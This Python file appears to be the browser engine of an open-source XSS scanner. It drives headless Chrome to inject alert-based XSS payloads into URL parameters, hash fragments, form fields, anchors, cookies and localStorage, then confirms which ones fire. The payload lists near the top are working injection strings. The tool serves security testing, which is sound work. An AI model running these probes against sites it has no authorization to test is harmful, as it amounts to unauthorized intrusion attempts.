# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""BrowserEngine — headless Selenium-based XSS detection for JavaScript SPAs."""

from __future__ import annotations

import time
import urllib.parse
from typing import Any

from ..reporter import BrowserFinding
from ..log import get_logger

logger = get_logger("stingxss.browser")

# Payloads to test in browser — ordered by likelihood of firing.
# Backtick variants are tested first because Juice Shop's bypassSecurityTrustHtml
# renders those; single/double-quote variants cover other sinks.
_BROWSER_PAYLOADS = [
    # img onerror — fires through Angular bypassSecurityTrustHtml and plain innerHTML
    "<img src=x onerror=\"alert(`{marker}`)\">",
    "<img src=x onerror=\"alert('{marker}')\">",
    # svg onload — alternative to img
    "<svg onload=\"alert(`{marker}`)\">",
    # iframe javascript: with backticks — required for Juice Shop reflected/DOM challenges
    "<iframe src=\"javascript:alert(`{marker}`)\">",
    # iframe javascript: with single quotes — fallback
    "<iframe src=\"javascript:alert('{marker}')\">",
]

# Payloads for javascript: URI sinks (a.href, form.action, document.location, etc.)
# The page assigns location.hash/search directly to href/location — no HTML tag needed.
_JAVASCRIPT_URI_PAYLOADS = [
    "javascript:alert(`{marker}`)",
    "javascript:alert('{marker}')",
]

# Payloads for event-triggered sinks (form input value, typing events)
# These need to be plain JS expressions that eval/innerHTML/documentWrite can execute.
_EVENT_PAYLOADS = [
    "alert(`{marker}`)",                          # eval() sink
    "<img src=x onerror=\"alert(`{marker}`)\">",  # innerHTML / documentWrite sink
    "alert('{marker}')",                           # eval() fallback
    "<img src=x onerror=\"alert('{marker}')\">",  # innerHTML fallback
]

_ALERT_HOOK_JS = (
    "window._stingxss_hits=[];"
    "window.alert=window.confirm=window.prompt=function(v)"
    "{window._stingxss_hits.push(String(v));}"
)

_SPA_BOOTSTRAP_SLEEP  = 0.75  # seconds to wait for Angular/Vue/React init
_XSS_FIRE_TIMEOUT    = 2.0   # max seconds to poll for XSS to fire after navigation
_INTERACTION_TIMEOUT = 0.75  # max seconds to poll after a DOM interaction (click/type)
_POLL_INTERVAL       = 0.1   # polling granularity in seconds


def _wait_for_hits(driver: Any, marker: str, timeout_s: float) -> list[str]:
    """Poll window._stingxss_hits until *marker* appears or *timeout_s* elapses."""
    deadline = time.monotonic() + timeout_s
    while True:
        try:
            hits = driver.execute_script("return window._stingxss_hits||[]")
            hits = hits if isinstance(hits, list) else []
        except Exception:
            hits = []
        if any(marker in h for h in hits):
            return hits
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return hits
        time.sleep(min(_POLL_INTERVAL, remaining))


class BrowserEngine:
    def __init__(
        self,
        chromium_path:     str   = "",
        chromedriver_path: str   = "",
        headless:          bool  = True,
        timeout:           int   = 20,
    ) -> None:
        self.chromium_path     = chromium_path
        self.chromedriver_path = chromedriver_path
        self.headless          = headless
        self.timeout           = timeout

    def _setup_driver(self) -> Any:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.chrome.options import Options

        opts = Options()
        if self.headless:
            opts.add_argument("--headless")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")

        # Resolve chromium binary
        chromium = self.chromium_path
        if not chromium:
            import shutil
            for candidate in ("/usr/bin/chromium", "chromium", "google-chrome"):
                if candidate.startswith("/") or shutil.which(candidate):
                    chromium = candidate
                    break
        if chromium:
            opts.binary_location = chromium

        # Resolve chromedriver
        chromedriver = self.chromedriver_path
        if not chromedriver:
            import shutil
            for candidate in ("/usr/bin/chromedriver", "chromedriver"):
                if candidate.startswith("/") or shutil.which(candidate):
                    chromedriver = candidate
                    break

        svc = Service(chromedriver) if chromedriver else Service()
        driver = webdriver.Chrome(service=svc, options=opts)
        driver.set_page_load_timeout(self.timeout)
        return driver

    def _install_alert_hook(self, driver: Any) -> None:
        driver.execute_cdp_cmd(
            "Page.addScriptToEvaluateOnNewDocument",
            {"source": _ALERT_HOOK_JS},
        )

    def _get_hits(self, driver: Any) -> list[str]:
        try:
            hits = driver.execute_script("return window._stingxss_hits||[]")
            return hits if isinstance(hits, list) else []
        except Exception:
            return []

    def _try_form_interaction(self, driver: Any, marker: str) -> str | None:
        """Fill all visible text inputs with each event payload, submit forms.

        Returns the payload string that triggered an alert, or None.
        """
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys

        for payload in [p.replace("{marker}", marker) for p in _EVENT_PAYLOADS]:
            try:
                # Fill every visible text-like input
                inputs = driver.find_elements(
                    By.CSS_SELECTOR,
                    "input:not([type=hidden]):not([type=submit]):not([type=button])"
                    ":not([type=reset]):not([type=checkbox]):not([type=radio]), textarea",
                )
                for inp in inputs:
                    try:
                        inp.clear()
                        inp.send_keys(payload)
                        # Trigger keyup/change events
                        inp.send_keys(Keys.TAB)
                    except Exception:
                        pass

                hits = _wait_for_hits(driver, marker, _INTERACTION_TIMEOUT)
                if any(marker in h for h in hits):
                    return payload

                # Also try submitting forms
                forms = driver.find_elements(By.TAG_NAME, "form")
                for form in forms:
                    try:
                        form.submit()
                    except Exception:
                        pass

                hits = _wait_for_hits(driver, marker, _INTERACTION_TIMEOUT)
                if any(marker in h for h in hits):
                    return payload

            except Exception as exc:
                logger.debug("Form interaction error: %s", exc)

        return None

    def _try_anchor_click(self, driver: Any, marker: str) -> str | None:
        """Click any anchors whose href contains a javascript: URI with our marker.

        Returns the payload string if an alert fires, or None.
        """
        from selenium.webdriver.common.by import By

        for payload in [p.replace("{marker}", marker) for p in _JAVASCRIPT_URI_PAYLOADS]:
            try:
                anchors = driver.find_elements(By.TAG_NAME, "a")
                for anchor in anchors:
                    try:
                        href = anchor.get_attribute("href") or ""
                        if "javascript:" in href.lower():
                            driver.execute_script("arguments[0].click();", anchor)
                            hits = _wait_for_hits(driver, marker, _INTERACTION_TIMEOUT)
                            if any(marker in h for h in hits):
                                return payload
                    except Exception:
                        pass
            except Exception as exc:
                logger.debug("Anchor click error: %s", exc)

        return None

    def scan_url(
        self,
        url:      str,
        params:   dict[str, str],
        marker:   str,
        headers:  dict[str, str] | None = None,
        cookies:  str = "",
        base_url: str | None = None,
    ) -> list[BrowserFinding]:
        """Test each param in *params* for DOM/reflected XSS via headless browser.

        Also automatically discovers and tests params that live inside the URL's
        hash fragment (Angular / Vue hash-router style: ``#/path?param=val``).

        After each navigation, attempts DOM interaction (form fill/submit, typing,
        anchor clicks) to trigger event-driven and javascript:-URI sinks.
        """
        # Merge caller-supplied params with any hash-fragment params in the URL
        all_params = dict(_hash_params(url))
        all_params.update(params)

        findings: list[BrowserFinding] = []
        if not all_params:
            return findings

        # Derive base URL for SPA bootstrap (scheme + host)
        parsed = urllib.parse.urlparse(url)
        spa_base = base_url or f"{parsed.scheme}://{parsed.netloc}/"

        driver = None
        try:
            driver = self._setup_driver()
            self._install_alert_hook(driver)

            # Bootstrap SPA once so Angular/Vue/React is initialised
            driver.get(spa_base)
            time.sleep(_SPA_BOOTSTRAP_SLEEP)

            for param in all_params:
                # --- Pass 1: standard HTML-injection payloads ---
                html_payloads = [p.replace("{marker}", marker) for p in _BROWSER_PAYLOADS]
                for payload in html_payloads:
                    try:
                        test_url = _inject_param(url, param, payload)
                        driver.get(test_url)
                        hits = _wait_for_hits(driver, marker, _XSS_FIRE_TIMEOUT)
                        confirmed = any(marker in h for h in hits)
                        if not confirmed:
                            # Attempt DOM interaction to trigger event-driven sinks
                            confirmed_payload = self._try_form_interaction(driver, marker)
                            if confirmed_payload:
                                confirmed = True
                                payload = confirmed_payload
                            else:
                                confirmed_payload = self._try_anchor_click(driver, marker)
                                if confirmed_payload:
                                    confirmed = True
                                    payload = confirmed_payload
                        if confirmed:
                            hits = self._get_hits(driver)
                            evidence = next((h for h in hits if marker in h), marker)
                            findings.append(BrowserFinding(
                                url=test_url,
                                parameter=param,
                                method="GET",
                                payload=payload,
                                marker=marker,
                                confirmed=True,
                                evidence=evidence,
                            ))
                            logger.info(
                                "Browser XSS confirmed: param=%s url=%s marker=%s",
                                param, test_url, marker,
                            )
                            break  # one confirmed payload per param is enough
                    except Exception as exc:
                        logger.debug("Browser probe error (param=%s): %s", param, exc)
                        # Recover: reinstall hook and re-bootstrap
                        try:
                            self._install_alert_hook(driver)
                            driver.get(spa_base)
                            time.sleep(_SPA_BOOTSTRAP_SLEEP)
                        except Exception:
                            pass
                    if any(f.parameter == param for f in findings):
                        break

                if any(f.parameter == param for f in findings):
                    continue

                # --- Pass 2: javascript: URI payloads for hash/location sinks ---
                for payload in [p.replace("{marker}", marker) for p in _JAVASCRIPT_URI_PAYLOADS]:
                    try:
                        test_url = _inject_param(url, param, payload)
                        driver.get(test_url)
                        hits = _wait_for_hits(driver, marker, _XSS_FIRE_TIMEOUT)
                        if any(marker in h for h in hits):
                            evidence = next(h for h in hits if marker in h)
                            findings.append(BrowserFinding(
                                url=test_url,
                                parameter=param,
                                method="GET",
                                payload=payload,
                                marker=marker,
                                confirmed=True,
                                evidence=evidence,
                            ))
                            logger.info(
                                "Browser XSS confirmed (js-uri): param=%s url=%s marker=%s",
                                param, test_url, marker,
                            )
                            break
                        # Anchor may have been created with the javascript: href — click it
                        clicked = self._try_anchor_click(driver, marker)
                        if clicked:
                            hits = self._get_hits(driver)
                            evidence = next((h for h in hits if marker in h), marker)
                            findings.append(BrowserFinding(
                                url=test_url,
                                parameter=param,
                                method="GET",
                                payload=payload,
                                marker=marker,
                                confirmed=True,
                                evidence=evidence,
                            ))
                            logger.info(
                                "Browser XSS confirmed (anchor-click): param=%s url=%s marker=%s",
                                param, test_url, marker,
                            )
                            break
                    except Exception as exc:
                        logger.debug("Browser js-uri probe error (param=%s): %s", param, exc)
                    if any(f.parameter == param for f in findings):
                        break

        except Exception as exc:
            logger.warning("BrowserEngine.scan_url failed: %s", exc)
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass

        return findings

    def scan_url_with_preseeded_storage(
        self,
        url:    str,
        marker: str,
        base_url: str | None = None,
    ) -> list[BrowserFinding]:
        """Test cookie and localStorage injection sinks.

        Injects the marker payload into document.cookie and localStorage keys
        via CDP *before* page load, then checks whether a page that reads those
        sources and passes them to a sink (eval, $parse, innerHTML, etc.) fires
        an alert.

        This covers:
        - Angular ``$parse(document.cookie)``  (firing-range angular_cookie_parse)
        - Angular ``$parse(localStorage.getItem(key))``  (angular_storage_parse)
        - Any inline-script that reads cookie/localStorage into eval/innerHTML
        """
        findings: list[BrowserFinding] = []
        parsed   = urllib.parse.urlparse(url)
        spa_base = base_url or f"{parsed.scheme}://{parsed.netloc}/"

        # We need to know which cookie/localStorage keys the page uses.
        # Strategy: first load the page normally, collect all cookie names and
        # localStorage keys, then reload with each key poisoned.
        driver = None
        try:
            driver = self._setup_driver()
            self._install_alert_hook(driver)

            driver.get(url)
            time.sleep(_SPA_BOOTSTRAP_SLEEP)

            # Collect existing keys
            try:
                cookie_names = [c["name"] for c in driver.get_cookies()]
            except Exception:
                cookie_names = []
            try:
                ls_keys = driver.execute_script(
                    "return Object.keys(localStorage)"
                ) or []
            except Exception:
                ls_keys = []

            if not cookie_names and not ls_keys:
                return findings

            driver.quit()
            driver = None

            for payload_tpl in _EVENT_PAYLOADS:
                payload = payload_tpl.replace("{marker}", marker)

                # Build CDP pre-seed script
                seed_lines = []
                for name in cookie_names:
                    escaped = payload.replace("\\", "\\\\").replace("`", "\\`")
                    seed_lines.append(f"document.cookie=`{name}={escaped}`;")
                for key in ls_keys:
                    escaped = payload.replace("\\", "\\\\").replace("`", "\\`")
                    seed_lines.append(f"localStorage.setItem(`{key}`,`{escaped}`);")

                seed_script = _ALERT_HOOK_JS + "\n" + "\n".join(seed_lines)

                driver = self._setup_driver()
                driver.execute_cdp_cmd(
                    "Page.addScriptToEvaluateOnNewDocument",
                    {"source": seed_script},
                )
                try:
                    driver.get(url)
                    hits = _wait_for_hits(driver, marker, _XSS_FIRE_TIMEOUT)
                    if any(marker in h for h in hits):
                        evidence = next(h for h in hits if marker in h)
                        findings.append(BrowserFinding(
                            url=url,
                            parameter="[cookie/localStorage]",
                            method="GET",
                            payload=payload,
                            marker=marker,
                            confirmed=True,
                            evidence=evidence,
                        ))
                        logger.info(
                            "Browser XSS confirmed (storage-preseed): url=%s marker=%s",
                            url, marker,
                        )
                        break
                except Exception as exc:
                    logger.debug("Storage preseed probe error: %s", exc)
                finally:
                    try:
                        driver.quit()
                    except Exception:
                        pass
                    driver = None

                if findings:
                    break

        except Exception as exc:
            logger.warning("BrowserEngine.scan_url_with_preseeded_storage failed: %s", exc)
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass

        return findings

    def check_stored(
        self,
        revisit_urls: list[str],
        marker:       str,
        base_url:     str | None = None,
    ) -> BrowserFinding | None:
        """Visit each URL; return a BrowserFinding if the marker fires as an alert."""
        if not revisit_urls:
            return None

        first_url = revisit_urls[0]
        parsed = urllib.parse.urlparse(first_url)
        spa_base = base_url or f"{parsed.scheme}://{parsed.netloc}/"

        driver = None
        try:
            driver = self._setup_driver()
            self._install_alert_hook(driver)

            driver.get(spa_base)
            time.sleep(_SPA_BOOTSTRAP_SLEEP)

            for revisit_url in revisit_urls:
                try:
                    driver.get(revisit_url)
                    hits = _wait_for_hits(driver, marker, _XSS_FIRE_TIMEOUT)
                    confirmed = any(marker in h for h in hits)
                    if confirmed:
                        evidence = next(h for h in hits if marker in h)
                        logger.info(
                            "Browser stored XSS confirmed: revisit=%s marker=%s",
                            revisit_url, marker,
                        )
                        return BrowserFinding(
                            url=revisit_url,
                            parameter=f"[stored] {revisit_url}",
                            method="GET",
                            payload="(stored)",
                            marker=marker,
                            confirmed=True,
                            evidence=evidence,
                        )
                except Exception as exc:
                    logger.debug("Browser stored probe error (%s): %s", revisit_url, exc)
        except Exception as exc:
            logger.warning("BrowserEngine.check_stored failed: %s", exc)
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass

        return None


def _inject_param(url: str, param: str, value: str) -> str:
    """Return *url* with *param* replaced by *value*.

    Handles both regular query strings (?param=val) and hash-fragment query
    strings (#/path?param=val) — Angular / Vue / React hash routers put params
    in the fragment, which the HTTP server never sees but the browser does.
    """
    parsed = urllib.parse.urlparse(url)

    # Does the fragment contain its own query string?  (#/path?q=...)
    frag = parsed.fragment  # e.g.  "/search?q=test"
    if "?" in frag:
        frag_path, frag_qs = frag.split("?", 1)
        frag_params = urllib.parse.parse_qs(frag_qs, keep_blank_values=True)
        if param in frag_params or not parsed.query:
            # Inject into the fragment query string
            frag_params[param] = [value]
            new_frag = frag_path + "?" + urllib.parse.urlencode(frag_params, doseq=True)
            return urllib.parse.urlunparse(parsed._replace(fragment=new_frag))

    # Fall back to regular query string
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def _hash_params(url: str) -> dict[str, str]:
    """Return params found inside the hash fragment query string, if any."""
    frag = urllib.parse.urlparse(url).fragment
    if "?" not in frag:
        return {}
    _, frag_qs = frag.split("?", 1)
    return {k: (v[0] if v else "") for k, v in urllib.parse.parse_qs(frag_qs).items()}
